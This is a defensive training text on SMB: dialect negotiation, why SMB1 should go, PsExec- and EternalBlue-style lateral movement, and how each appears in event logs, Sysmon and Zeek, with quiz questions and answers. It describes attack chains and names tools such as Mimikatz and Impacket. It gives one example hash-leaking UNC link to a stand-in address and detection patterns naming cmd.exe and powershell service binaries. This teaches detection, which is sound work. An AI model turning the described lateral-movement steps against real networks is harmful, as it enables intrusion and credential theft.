docs.text:
The first SMB message is NEGOTIATE. The client says "these are the dialects I speak," the server picks the highest one both sides support, and the rest of the session uses that. Like two people from different countries checking which languages they share and choosing the one both speak best.

Here is what it looks like in a capture, using tshark (Wireshark's command-line version):

$ tshark -r fs-session.pcap -Y "smb2.cmd == 0" -T fields -e frame.time -e ip.src -e ip.dst -e smb2.flags.response -e smb2.dialect
Nov 18, 2026 09:01:12.104  10.20.30.41  10.20.0.20  0  0x0202,0x0210,0x0300,0x0302,0x0311
Nov 18, 2026 09:01:12.106  10.20.0.20  10.20.30.41  1  0x0311

The command:

  • -r fs-session.pcap — read this capture file.
  • -Y "smb2.cmd == 0" — display filter: only SMB2 command 0, which is NEGOTIATE.
  • -T fields -e … — print just these fields, tab-separated: time, source, destination, whether it's a response (smb2.flags.response, 0 = request, 1 = response), and the dialect(s).

The output:

  • Line 1 — the client 10.20.30.41 (a Windows 11 laptop) offers 0x0202 (2.0.2), 0x0210 (2.1), 0x0300, 0x0302, 0x0311.
  • Line 2 — the file server 10.20.0.20 replies choosing 0x0311 = SMB 3.1.1. Everything after this is 3.1.1.

A client that only offers SMB1 doesn't send an SMB2 NEGOTIATE at all; it sends an SMB1 Negotiate Protocol Request listing strings like NT LM 0.12. In Wireshark the filter smb (as opposed to smb2) shows SMB1 traffic. Any SMB1 on a modern network is a finding: either an old device that needs replacing, or a scanner or exploit tool (many SMB1 exploits and scanners start with an SMB1 negotiate).

Checking on a Windows machine:

Get-SmbConnection | Select-Object ServerName, ShareName, UserName, Dialect
  • Get-SmbConnection — lists the SMB connections this machine (as a client) currently has open.
  • Select-Object — shows only the columns we care about.
ServerName   ShareName  UserName          Dialect
----------   ---------  --------          -------
SRV-FS-0001  Finance    CORP\j.kim        3.1.1
dc01         IPC$       CORP\LT-FIN-0412$ 3.1.1

Every line should say 3.x. A 2.0.2, or 1.5 (how Windows displays SMB1), points to an old server or NAS.

And whether SMB1 still exists on a machine:

Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol | Select-Object FeatureName, State
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, RequireSecuritySignature, EncryptData

FeatureName   State
-----------   -----
SMB1Protocol  Disabled

EnableSMB1Protocol RequireSecuritySignature EncryptData
------------------ ------------------------ -----------
             False                     True       False
  • SMB1Protocol Disabled — the SMB1 component is not installed. This is the default on current Windows.
  • EnableSMB1Protocol False — the server side won't accept SMB1.
  • RequireSecuritySignature True — the server requires signing (each message carries a signature so it can't be altered or relayed).
  • EncryptData False — encryption isn't forced for all shares (it can be enabled per share or globally).

[Supplement] Before removing SMB1 in a big network, you can find out who still uses it: Set-SmbServerConfiguration -AuditSmb1Access $true makes the server log event 3000 in Microsoft-Windows-SMBServer/Audit each time a client connects with SMB1, with the client's address. Collect that for a few weeks, fix or replace those clients, then remove SMB1.

docs.title: Why SMB1 must go — and what about SMB2?
docs.text:
SMB1 was designed in an era with no adversaries in mind. The negotiation can be tampered with (forced downgrade), signing is weak and slow so it was usually off, there's no encryption, and the code is old and complex. The 2017 MS17-010 bugs — exploited by EternalBlue, EternalRomance, EternalSynergy and EternalChampion, the NSA-built tools leaked by the Shadow Brokers — all live in the SMB1 server code. A machine with SMB1 removed simply doesn't have the vulnerable code path. Microsoft's own SMB team has been telling people to stop using SMB1 for years, and current Windows doesn't install it. See EternalBlue and SMBv1 for the exploit itself.

[Correction] You may read "ideally turn off SMB2 as well." Be careful with that. Since 2.x and 3.x share one protocol stack, disabling "SMB2" on Windows (EnableSMB2Protocol $false) also disables SMB 3.x and breaks file sharing, Group Policy and much more; Microsoft explicitly advises against it. The sensible modern version of that advice is: allow only SMB 3.x by setting a minimum dialect (supported in Windows 11 24H2 and Windows Server 2025, for example Set-SmbServerConfiguration -Smb2DialectMin SMB300), after checking that nothing old still needs 2.x.

docs.title: Typical SMB attacks
docs.text:
SMB attacks fall into two families. This picture shows both:

                                     ┌─────────────────────────┐
                                     │ SRV-APP-0007 (unpatched)│ ◀── 2) exploit over 445
                                     └─────────────────────────┘     succeeds: SYSTEM
                                                  ▲
   Internet                                       │ SMB exploit (EternalBlue style)
  ┌────────┐   C2 over HTTPS    ┌──────────────┐  │
  │attacker│ ◀────────────────▶ │ LT-FIN-0412  │──┘
  └────────┘                    │ (phished)    │──┐
                                └──────────────┘  │ 1) PsExec with shared
                                     │            │    local admin password
                                     │            ▼
                                     │      ┌──────────────┐   ┌──────────────┐
                                     │      │ LT-FIN-0419  │──▶│ LT-HR-0233   │ ...
                                     │      └──────────────┘   └──────────────┘
                                     ▼
                         ┌──────────────────────────────┐
                         │ SRV-FS-0001 (patched,        │ ◀── exploit blocked:
                         │ host firewall blocks 445)    │     445 filtered
                         └──────────────────────────────┘
  1. Credential-based (PsExec style). The phished laptop gives the attacker a foothold. Using the shared local admin password, they hop to LT-FIN-0419, then LT-HR-0233, and so on. No vulnerability is needed — the login is "legitimate", which is why antivirus often says nothing.
  2. Exploit-based (EternalBlue style). From the foothold, the attacker scans for open 445 and fires an exploit at each. SRV-APP-0007 is unpatched and falls (SYSTEM). SRV-FS-0001 is patched and its firewall filters 445 from workstations, so the exploit never lands.

In both cases the attacker typically becomes Administrator or SYSTEM, not a normal user. And once admin, tools like Mimikatz read the memory of LSASS (the process holding logon secrets) and pull the credentials of everyone currently logged on to that machine — maybe a helpdesk or domain admin who logged in to fix something. More accounts, more hops. See LSASS dumping.

docs.title: What a PsExec hop looks like in the logs
docs.text:
Let's follow one hop: the attacker on LT-FIN-0412 (10.20.30.41) runs PsExec against LT-FIN-0419 (10.20.30.52) with the local Administrator account. More detail on the technique: PsExec and SMB lateral movement.

On the source (LT-FIN-0412) — Sysmon event 3 (network connection):

Event ID: 3   Network connection detected
UtcTime:          2026-11-18 05:14:07.311
Image:            C:\Users\j.kim\AppData\Local\Temp\ps.exe
User:             CORP\j.kim
Protocol:         tcp
SourceIp:         10.20.30.41
DestinationIp:    10.20.30.52
DestinationPort:  445
  • Sysmon (a free Microsoft tool that adds detailed logging) event 3 records which process made a network connection. Windows alone doesn't tell you that.
  • Image — the program that connected. A renamed PsExec running from a Temp folder (ps.exe) — real admins don't run tools from a user's Temp.
  • DestinationPort 445 from a workstation to another workstation: normal PCs talk SMB to file servers and DCs, not to each other. This one connection is already a strong lead.

On the target (LT-FIN-0419) — Security log 4624 (logon success):

Event ID: 4624   An account was successfully logged on
Logon Type:                3
New Logon:  Account Name:  Administrator
            Account Domain: LT-FIN-0419
            Logon ID:      0x3E1A7F2
Network Information:
            Workstation Name: LT-FIN-0412
            Source Network Address: 10.20.30.41
Detailed Authentication Information:
            Logon Process:          NtLmSsp
            Authentication Package: NTLM
  • 4624 fires on the machine being logged on to, every time a logon succeeds. (A failure is 4625; a burst of 4625s for Administrator from one source across many PCs is password spraying or guessing.)
  • Logon Type 3 = network logon: someone accessed this machine over the network (SMB, for example), not at its keyboard (2) or via RDP (10).
  • Account Name Administrator, Account Domain LT-FIN-0419 — the local admin account of this PC, not a domain account. Domain environments rarely have a good reason for local-admin network logons between PCs.
  • Source Network Address 10.20.30.41 — where it came from. With DHCP you turn that into LT-FIN-0412.
  • Authentication Package NTLM — local accounts can't use Kerberos, so NTLM is expected here; it's also what pass-the-hash uses.
  • Logon ID 0x3E1A7F2 — the session number. Every following event in this session carries the same Logon ID, so you can tie them together.

4672 (special privileges assigned to new logon) follows immediately with the same Logon ID: the session has admin-level privileges (SeDebugPrivilege, SeBackupPrivilege and so on). Attackers care because admin is required for this whole technique; defenders care because 4624 type 3 + 4672 from a workstation peer is "an admin just came in over the network."

5140 (a network share object was accessed):

Event ID: 5140   A network share object was accessed
Account Name:   Administrator      Logon ID: 0x3E1A7F2
Source Address: 10.20.30.41
Share Name:     \\*\ADMIN$
Share Path:     \??\C:\Windows
Access Mask:    0x1
  • Fires the first time a session touches a share — but only if "Audit File Share" is enabled (it isn't by default on workstations).
  • Share Name \\*\ADMIN$ — the administrative share pointing at C:\Windows. Normal users never connect to ADMIN$ on a colleague's PC. This is the door attack tools use.

5145 (detailed file share check) records the individual file: Share Name \\*\ADMIN$, Relative Target Name PSEXESVC.exe, Accesses WriteData (or AddFile). It needs "Audit Detailed File Share", which is very noisy on file servers, but on workstations it's quiet enough to be useful.

System log 7045 (a service was installed in the system):

Event ID: 7045   Source: Service Control Manager
Service Name:       PSEXESVC
Service File Name:  %SystemRoot%\PSEXESVC.exe
Service Type:       user mode service
Service Start Type: demand start
Service Account:    LocalSystem
  • 7045 is in the System log and is on by default: any new service writes it. 4697 is the Security-log twin (needs "Audit Security System Extension").
  • PSEXESVC is PsExec's default service name (it can be renamed with an option). Impacket's psexec uses random short names and random .exe names; smbexec-style tools use cmd.exe itself as the service binary, so look for Service File Name containing cmd.exe /c, %COMSPEC% or powershell.
  • Services in C:\Windows\ with odd names, demand start, running as LocalSystem, created right after a type 3 logon from a peer: a classic lateral-movement pattern.

4688 / Sysmon 1 (process creation): services.exe → PSEXESVC.exe → cmd.exe → whatever the attacker types (whoami, net group "domain admins" /domain, a credential dumper). 4688 needs "Audit Process Creation" (and the command-line option) enabled; Sysmon 1 includes the command line and hashes by default.

Put together on a timeline (target clock, UTC):

05:14:07  4624  type 3, LT-FIN-0419\Administrator, from 10.20.30.41, NTLM, LogonID 0x3E1A7F2
05:14:07  4672  same LogonID, admin privileges
05:14:07  5140  \\*\ADMIN$ from 10.20.30.41
05:14:07  5145  ADMIN$\PSEXESVC.exe WriteData
05:14:08  7045  service PSEXESVC, %SystemRoot%\PSEXESVC.exe, LocalSystem
05:14:08  4688  services.exe -> PSEXESVC.exe
05:14:09  4688  PSEXESVC.exe -> cmd.exe
05:14:15  4688  cmd.exe -> whoami.exe

Eight seconds, and the story is complete: who (local Administrator), from where (10.20.30.41), how (SMB + new service), what next (commands as SYSTEM).

docs.title: What the same hop looks like on the wire — Zeek
docs.text:
A network sensor running Zeek sees the same hop without touching the endpoints. Zeek writes several SMB-related logs:

# smb_mapping.log — which shares were connected
ts=2026-11-18T05:14:07Z uid=CmQ1z84 id.orig_h=10.20.30.41 id.resp_h=10.20.30.52 id.resp_p=445 path=\\10.20.30.52\ADMIN$ share_type=DISK

# smb_files.log — which files were opened/written
ts=2026-11-18T05:14:07Z uid=CmQ1z84 id.orig_h=10.20.30.41 id.resp_h=10.20.30.52 action=SMB::FILE_WRITE path=\\10.20.30.52\ADMIN$ name=PSEXESVC.exe size=383872

# dce_rpc.log — remote management calls over named pipes
ts=2026-11-18T05:14:08Z uid=CmQ1z84 id.orig_h=10.20.30.41 id.resp_h=10.20.30.52 named_pipe=svcctl endpoint=svcctl operation=CreateServiceW
ts=2026-11-18T05:14:08Z uid=CmQ1z84 id.orig_h=10.20.30.41 id.resp_h=10.20.30.52 named_pipe=svcctl endpoint=svcctl operation=StartServiceW
  • uid — the connection ID. The same uid in all three logs means one TCP connection did all of this; you can also find it in conn.log.
  • smb_mapping.log path=\\10.20.30.52\ADMIN$ — a workstation mapping another workstation's admin share.
  • smb_files.log name=PSEXESVC.exe — an executable written to ADMIN$. If Zeek's file analysis is on, files.log will have its hash.
  • dce_rpc.log endpoint=svcctl operation=CreateServiceW then StartServiceW — remote service creation and start. That pair over SMB from a workstation is one of the most reliable network-side lateral movement signals. (Other endpoints to know: atsvc/ITaskSchedulerService = remote scheduled tasks, winreg = remote registry, samr/lsarpc = account and domain enumeration.)

[Supplement] When SMB 3 encryption is on, Zeek and Wireshark can see the negotiation and authentication but not the share paths, file names or RPC calls inside. Signing alone doesn't hide content. So in environments that encrypt SMB, endpoint logs (above) carry more of the weight, and connection metadata (who talks 445 to whom) becomes the network's main contribution.

docs.title: What an exploit attempt looks like
docs.text:
The exploit family leaves different traces:

  • SMB1 negotiation where there should be none, especially from a workstation to many hosts.
  • One source touching 445 on many hosts in seconds — a scan to find targets. In conn.log, many short connections to 445 from one id.orig_h, many with conn_state REJ or S0 (no answer).
  • IDS signatures. Public exploits like EternalBlue have well-known network signatures (malformed SMB1 transaction requests, the DoublePulsar backdoor's "ping" responses).
  • On a hit, no logon events. An exploit doesn't log on, so you may see no 4624 at all — just lsass.exe or spoolsv.exe-style system processes suddenly spawning cmd.exe or rundll32.exe, or a crash (System log bugcheck) if the exploit fails. Process-tree anomalies from SYSTEM processes are the endpoint clue.

docs.title: Defending SMB — what a SOC should push for
docs.text:
• Never expose 445 (or 139) to the internet, in either direction. Outbound 445 matters too: blocking it stops leaks of NTLM hashes to attacker servers (a malicious link like \\203.0.113.50\share makes Windows try to authenticate).
  • Block 445 between workstations with host firewalls. Workstations need SMB to file servers and DCs, not to each other. This one rule breaks most of the lateral movement above.
  • Unique local admin passwords on every machine (Windows LAPS), and deny network logon for local accounts on workstations (the "Deny access to this computer from the network" right for the Local account and member of Administrators group principal).
  • Remove SMB1, patch SMB, and require signing (blocks NTLM relay over SMB — see LLMNR and NTLM relay).
  • Protect credentials in memory (Credential Guard, LSA protection) and keep privileged accounts off ordinary PCs (admin tiering).
  • Detect: workstation-to-workstation 445; ADMIN$/C$ access from non-admin hosts; 7045/4697 new services right after a type 3 logon; Zeek svcctl CreateServiceW; any SMB1.

docs.title: The 2026 view
docs.text:
[2026 Current] Still valid

SMB is still Windows' file-sharing and remote-management backbone on TCP 445, still open across most internal networks, and still one of the main roads for lateral movement and ransomware deployment. PsExec-style remote service creation, admin shares, the shared-local-admin-password problem, credential theft from LSASS after getting admin, and "SMB1 must be gone" are all exactly as described. The detection pairs (4624 type 3 + 4672 + 7045, Zeek svcctl calls) are unchanged.

[Changed] What has changed

  • Secure defaults in Windows 11 24H2 and Windows Server 2025. SMB signing is required by default for all inbound and outbound connections (previously only SYSVOL/NETLOGON and DC connections), guest fallback is off (Windows 11 Pro no longer allows guest access), an authentication rate limiter adds a 2-second delay after each failed NTLM or local Kerberos attempt (which makes password guessing over SMB slow), the SMB client can block NTLM for outbound connections, administrators can set minimum and maximum dialects, and SMB1 is not installed. Older NAS boxes that don't support signing may fail to connect after upgrading — the right fix is to update the NAS, not to switch signing off.
  • NTLM is on the way out. Microsoft has deprecated NTLM and removed NTLMv1 in Windows 11 24H2 and Windows Server 2025. NTLM (v2) itself still works and is still what local-account SMB logons and pass-the-hash use, so it remains very relevant to detection.
  • SMB over QUIC (SMB inside TLS 1.3 over UDP 443, for remote users without VPN) is available in all Windows Server 2025 editions. If you see SMB-to-server traffic on UDP 443, it may be legitimate — but it also means "445 blocked at the edge" no longer describes every SMB path.
  • Windows LAPS is built into Windows (since 2023 updates) and can store passwords in Entra ID or AD, so there's no excuse left for shared local admin passwords.
  • SMB vulnerabilities didn't stop with 2017. SMBGhost (CVE-2020-0796, SMB 3.1.1 compression) showed even SMB3 code can be wormable, and CVE-2025-33073 (an SMB client flaw that bypasses NTLM reflection protections and can give SYSTEM on machines that don't enforce signing) was patched in June 2025 and added to CISA's Known Exploited Vulnerabilities list in October 2025.
  • Ransomware still pushes payloads over SMB — copying the encryptor to ADMIN$/C$ and starting it with services, scheduled tasks or PsExec — and often encrypts file shares remotely over SMB from one machine, so the file server shows mass file writes from a single client rather than local malware.

[Caution] Wrong or risky to do the old way

  • Don't disable "SMB2" to get rid of old dialects. On Windows that also turns off SMB 3.x. Set a minimum dialect instead.
  • Don't treat "445 is blocked at the internet edge" as enough. The danger is internal; block 445 between workstations too.
  • Don't rely only on network logs if SMB encryption is on — share names and file names are hidden. Make sure 4624/4672/7045 (and ideally 5140/5145 on workstations, Sysmon 1/3) reach your SIEM.
  • Don't hunt only for the name PSEXESVC. It can be renamed, and other tools use random names or cmd.exe as the service binary. Hunt the behaviour: type 3 admin logon from a peer → admin share write → new service.
  • Don't turn signing off to "fix" an old NAS or printer after a Windows upgrade. That reopens NTLM relay. Update or replace the device.

docs.title: Question 1
docs.text:
A colleague says, "SMB is just file sharing. The worst an attacker can do with it is read our documents." Explain why that is wrong, and what makes a shared local Administrator password so dangerous in a network where 445 is open between all PCs.

Answer and explanation

Why it's wrong: with admin credentials for a machine, SMB is a remote execution channel, not just file access. Through the admin shares (ADMIN$, C$) an attacker can copy a program onto the target, then use the svcctl named pipe over IPC$ to create and start a service that runs it as SYSTEM — exactly what PsExec does — and get an interactive command line. It's comparable to SSH, except it needs admin rights.

Why shared passwords are deadly: if every PC has the same local Administrator password, stealing it (or its NTLM hash) from one phished machine gives admin on all of them. With 445 reachable between PCs, the attacker can hop machine to machine (or a worm can do it automatically, as NotPetya did), and on each one dump the credentials of whoever is logged on, until they find a domain admin. One infected laptop → full compromise. The fixes: unique passwords per machine (Windows LAPS), block 445 between workstations, deny network logon for local admin accounts.

docs.title: Question 2
docs.text:
On LT-HR-0233 (10.20.30.77) you find these events, all with Logon ID 0x51C0D9. Describe what happened and list what you would check next.

07:42:10  4624  Logon Type 3, Account LT-HR-0233\Administrator, Source 10.20.30.52, NTLM
07:42:10  4672  special privileges
07:42:10  5140  \\*\ADMIN$
07:42:11  7045  Service Name: XbKq  File: %SystemRoot%\wQmTrGfA.exe  LocalSystem  demand start
Answer and explanation

What happened: someone at 10.20.30.52 logged on over the network (type 3) as this PC's local Administrator using NTLM, got admin privileges (4672), opened the ADMIN$ share (5140), and within a second a new service with a random name (XbKq) running a random-named exe from C:\Windows as SYSTEM was installed (7045). That's remote service-based execution — the PsExec pattern, and the random names fit Impacket-style tools rather than real Sysinternals PsExec. This is lateral movement from 10.20.30.52 (which, in the example above, was itself a victim — LT-FIN-0419).

Next checks:

  1. Process creation (4688/Sysmon 1) on LT-HR-0233 after 07:42:11: what wQmTrGfA.exe launched (child processes, command lines), and its hash.
  2. Map 10.20.30.52 to a device with DHCP at 07:42, then look on that machine for the source side (Sysmon 3 to 445, the tool that ran) and how it was compromised — follow the chain back.
  3. Search all hosts for the same pattern (type 3 local Administrator logons from workstations, 7045 with random names) to find every hop.
  4. Credential exposure: which accounts were logged on to LT-HR-0233; assume their secrets are stolen and reset them. Rotate the local Administrator password everywhere (LAPS).
  5. Network: Zeek dce_rpc.log for svcctl CreateServiceW from 10.20.30.52 to others.

docs.title: Question 3
docs.text:
During a review you find these three things. For each, say whether it's a problem and what you'd do: (a) one old NAS that only negotiates SMB 2.0.2; (b) smb (SMB1) packets from a workstation to 40 different hosts within one minute; (c) a server admin proposes Set-SmbServerConfiguration -EnableSMB2Protocol $false "to get rid of old SMB2".

Answer and explanation

(a) Not an emergency, but a weakness. SMB 2.0.2 has no encryption and older signing, and if you move to an SMB 3.x-only minimum dialect that NAS will break. Plan a firmware update or replacement, check whether it supports signing (Windows 11 24H2/Server 2025 clients require signing by default), and keep it off networks where it isn't needed.

(b) A serious finding. Modern Windows doesn't speak SMB1 by default, and one workstation touching 445 on 40 hosts in a minute is scanning — very likely an SMB1 exploit or vulnerability scanner (EternalBlue-style tools start with SMB1 negotiation). Treat the workstation as compromised: isolate it, check its process that made the connections (Sysmon 3), check the targets for signs of a successful exploit (unexpected child processes of system processes, crashes), and confirm SMB1 is removed everywhere.

(c) Don't do it. On Windows, SMB 2.x and 3.x share one protocol stack, so disabling "SMB2" also disables SMB 3.x, breaking file shares and Group Policy. The correct way to drop old dialects is to set a minimum dialect (e.g. -Smb2DialectMin SMB300 on Windows Server 2025 / Windows 11 24H2) after confirming no client still needs 2.x — like the NAS in (a).
